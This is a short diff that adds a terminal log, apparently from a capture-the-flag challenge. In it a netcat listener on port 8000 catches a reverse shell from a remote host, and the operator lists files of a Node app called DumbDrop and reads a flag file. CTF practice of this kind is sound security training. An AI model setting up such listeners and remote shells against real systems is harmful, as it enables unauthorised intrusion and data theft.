@@ -1,0 +1,24 @@
+ataf@svc-backup-scan-server:~$ nc -lvnp 8000
+
+Listening on 0.0.0.0 8000
+ls
+cat /flag.txt
+
+Connection received on 104.131.169.180 43129
+
+Dockerfile
+DumbDrop
+LICENSE
+build.sh
+entrypoint.sh
+icon.png
+icon.svg
+node_modules
+package-lock.json
+package.json
+public
+server.js
+uploads
+ymls
+flag{81c32f51-5f27-46d4-a7ee-43659a1bf0e7}
+
